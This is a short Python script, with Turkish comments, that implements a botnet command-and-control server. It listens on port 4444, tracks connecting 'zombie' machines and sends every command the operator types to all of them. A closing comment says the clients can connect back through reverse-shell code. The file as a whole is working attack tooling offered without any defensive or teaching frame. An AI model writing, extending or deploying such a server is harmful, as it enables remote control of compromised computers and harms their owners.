import socket
import threading

print("--- BOTNET C2 MASTER SERVER ---")

bots = []

def handle_bot(client, addr):
    print(f"🧟 Yeni Zombi Bağlandı: {addr}")
    bots.append(client)

def broadcast_command():
    while True:
        cmd = input("Komutan@Botnet:~$ ")
        if cmd == "list":
            print(f"Bağlı Bot Sayısı: {len(bots)}")
            continue
            
        dead_bots = []
        for bot in bots:
            try:
                bot.send(cmd.encode())
            except:
                dead_bots.append(bot)
        
        # Ölü botları temizle
        for db in dead_bots: bots.remove(db)

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 4444))
    server.listen(10)
    
    # Komut gönderme thread'i
    threading.Thread(target=broadcast_command).start()
    
    print("Zombiler bekleniyor (Port 4444)...")
    while True:
        client, addr = server.accept()
        threading.Thread(target=handle_bot, args=(client, addr)).start()

start_server()
# Not: Client'lar "Reverse Shell" koduyla buraya bağlanabilir.